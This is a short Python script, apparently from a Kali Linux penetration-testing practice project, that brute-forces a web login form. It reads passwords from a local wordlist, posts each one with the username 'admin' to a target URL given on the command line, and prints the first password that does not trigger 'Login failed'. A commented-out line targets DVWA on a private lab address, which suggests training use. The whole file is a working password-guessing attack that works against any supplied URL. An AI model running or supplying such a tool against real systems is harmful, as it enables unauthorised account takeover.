import requests
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url', help='Target URL')
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error('Please enter target url')
    return options

def brute_force_password(target_url):
    data = {'username': 'admin', 'password': '123', 'Login': 'submit'}
    with open('/home/kali/PycharmProjects/Pentesting_tools/crawler/password.txt', 'r') as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data['password'] = word
            response = requests.post(target_url, data=data)
            if 'Login failed' not in str(response.content):
                print('[+] Got the password --> ' + word)
                exit()

#target_url = 'http://10.0.2.7/dvwa/login.php'
options = get_arguments()
target_url = options.url
try:
    if 'http://' not in target_url:
        target_url = 'http://' + target_url
    brute_force_password(target_url)
except KeyboardInterrupt:
    print('Mischief Managed!')




